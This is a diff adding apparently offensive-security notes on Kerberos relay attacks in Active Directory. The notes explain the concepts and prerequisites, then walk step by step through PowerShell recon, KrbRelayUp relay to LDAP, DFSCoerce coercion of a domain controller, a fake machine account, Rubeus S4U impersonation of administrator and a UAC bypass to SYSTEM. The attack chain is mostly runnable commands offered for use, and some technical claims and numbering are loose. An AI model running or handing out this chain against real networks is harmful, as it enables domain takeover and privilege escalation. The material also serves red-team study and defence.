@@ -1,0 +1,100 @@
+A Kerberos relay attack steals an AP-REQ ticket from one service 
+and re-uses it against a second service that shares the same 
+computer-account key (because both SPNs sit on the same $ machine 
+account). This works even though the SPNs’ service classes differ 
+(e.g. CIFS/ → LDAP/) because the key that decrypts the ticket is 
+the machine’s NT hash, not the SPN string itself and the SPN 
+string is not part of the signature.
+
+Unlike NTLM relay, the hop is limited to the same host but, if you 
+target a protocol that lets you write to LDAP, you can chain 
+into Resource-Based Constrained Delegation (RBCD) or AD CS enrollment 
+and pop NT AUTHORITY\SYSTEM in a single shot.
+
+
+#  1.Kerberos basics
+#   Token	                Purpose                Relay relevance
+TGT / AS-REQ            Proves the user               untouched
+   ↔ REP                    to the KDC	
+
+Service ticket /    Bound to one SPN; encrypted    interchangeable if
+ TGS-REQ ↔ REP       with the SPN owner's key      SPNs share account
+
+AP-REQ                   Client sends TGS           what we steal 
+                          to the service               & replay
+                          
+- Tickets are encrypted with the password-derived key of the 
+  account that owns the SPN.
+
+- The Authenticator inside the AP-REQ has a 5-minute timestamp; 
+  replay inside that window is valid until the service cache 
+  sees a duplicate.
+
+- Windows rarely checks if the SPN string in the ticket matches 
+  the service you hit, so a ticket for CIFS/HOST normally decrypts 
+  fine on LDAP/HOST.
+#  2.What must be true to relay Kerberos
+1.Shared key: source and target SPNs belong to the same computer 
+account (default on Windows servers).
+
+2.No channel protection: SMB/LDAP signing off and EPA off 
+for HTTP/LDAPS.
+
+3.You can intercept or coerce authentication: LLMNR/NBNS poison, 
+DNS spoof, PetitPotam / DFSCoerce RPC, fake AuthIP, rogue DCOM, etc..
+
+4.Ticket source not already used: you win the race before the real 
+packet hits or block it entirely; otherwise the server’s replay 
+cache fires Event 4649.
+5.You need to somehow be able to perform a MitM in the communication 
+maybe being part of the DNSAmins group to modify the DNS of the 
+domain or being able to change the HOST file of the victim.
+
+
+#Kerberos Relay Steps
+
+- 3.1 Recon the host
+
+powershell
+# find servers where HTTP, LDAP or CIFS share the same machine account
+Get-ADComputer -Filter * -Properties servicePrincipalName |
+  Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
+  Select Name,servicePrincipalName
+
+- 3.2 Start the relay listener
+
+*KrbRelayUp <- (wrapper on GitHub)
+
+powershell
+# one-click local SYSTEM via RBCD
+.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd
+ --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
+
+*KrbRelayUp wraps KrbRelay → LDAP → RBCD → Rubeus → SCM bypass
+ in one binary.
+
+- 3.3 Coerce Kerberos auth
+
+powershell
+# coerce DC to auth over SMB with DFSCoerce
+.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
+
+DFSCoerce makes the DC send a Kerberos CIFS/DC01 ticket to us.
+
+- 3.4 Relay the AP-REQ
+
+KrbRelay extracts the GSS blob from SMB, repackages it into 
+an LDAP bind, and forwards it to ldap://DC01—authentication succeeds 
+because the same key decrypts it.
+
+- 3.5 Abuse LDAP ➜ RBCD ➜ SYSTEM
+
+powershell
+# (auto inside KrbRelayUp) manual for clarity
+New-MachineAccount -Name "FAKE01" -Password "P@ss123"
+KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
+Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator 
+ /msdsspn:HOST/DC01 /ptt
+SCMUACBypass.exe
+
+You now own NT AUTHORITY\SYSTEM
